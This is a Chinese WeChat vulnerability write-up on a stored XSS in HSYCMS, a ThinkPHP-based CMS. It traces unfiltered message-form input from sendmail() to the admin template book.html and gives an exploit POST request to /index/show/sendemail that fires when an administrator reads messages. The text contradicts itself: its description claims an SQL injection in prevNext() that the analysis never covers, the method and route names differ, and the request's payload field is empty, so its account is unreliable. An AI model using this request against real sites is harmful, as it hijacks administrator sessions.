> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BLJyExp89tvnUDJvjuBtFA)

一、漏洞描述：

在 prevNext() 函数中，直接将接收到的传参，没有经过任何的过滤，直接作为 where 条件带入执行，从而造成 SQL 注入漏洞。

二、漏洞分析过程：

定位到漏洞代码：/app/index/controller/Show.php 中的 sendmail() 方法：

这里用 input() 方法接收 post 数据，然后直接调用 insert() 方法将数据插入到 book 表，中间没有任何过滤：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibeiammSTBgmBvSqx9gibJb7qf7qic4oeQFlYfFvJ7lF5YdTAfoDlEfcD4oA/640?wx_fmt=png)

book 表的字段如下：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibe9AHmCniafonSZibiamcGFOWXz4zAsbq9xaMYu9IPWMsiaGYAzUedj0QhDw/640?wx_fmt=png)

因为程序是基于 thinkphp 二开的，所以访问到此方法根据 tp 的路由：/index/show/sendemail，然后 POST 根据表的字段传入对应数据即可

然后分析一下输出过程：

/app/hsycms/controller/Site.php 中的 book() 方法

这里直接查询 book 表的数据，然后 assign() 将查到的数据 $list 直接赋值给模板

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibeibfNpnss2Pv4wbeNEOkjTY6j69TOhT6AKr1CGe0OATMn1vuRmxHnWIg/640?wx_fmt=png)

根据 tp 的模板定义规则，定位到模板文件：/admin/view/site/book.html

然后会输出以下这些字段，所以只需要将 XSS payload 插入这些字段中即可触发

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibeJg1VRDJjCSr3O14ZgcAUoHXk3rvZrVichariaX6qibS5EEXXUFXzHibZvQ/640?wx_fmt=png)

三、漏洞利用：

构造如下数据包即可：

```
POST /index/show/sendemail HTTP/1.1
Host: www.hsycms.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=j44mhqsbphnavuvr54vpj2poj1;user=1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

title=test&name=test&company=test&phone=111&content=
```

提示留言成功：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibezpT9RPrrEpjwqUkrkh8NAsXygoLFNnvuNh0zlzzadm8s6SCicicJc0ug/640?wx_fmt=png)

看一下数据库中的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibe81Oj3aIHf0jG5Fr2dGIsWqyiaFjv0e9KcM3KSqDhC44iaS4RskNP2y9Q/640?wx_fmt=png)

当管理员后台查看留言的时候就会触发：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibehybYwmKdYpISXgs9qia06171fplkhyuTb6qwZ6U6xibVUucA1m5rrx2A/640?wx_fmt=png)

成功触发 XSS：

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7lAQtVMm52CmF5tfCK69ibeUM6t9uI9bfomRrICcMVx8cUuZStxLbGZq5n5S2cPJhpEr1lZdWxYMQ/640?wx_fmt=png)

**点个赞和在看吧，欢迎转发！**

**点个赞和在看吧，欢迎转发！**

**点个赞和在看吧，欢迎转发！**

![](https://mmbiz.qpic.cn/mmbiz_gif/ehibzaP4CvW5hb2Px7LJVkWEktazM0liacYxsJOVsyUz8lx6MSWyGTmJyJsPsgj9sOSueI5JRuQLTCPW5njR68aA/640?wx_fmt=gif)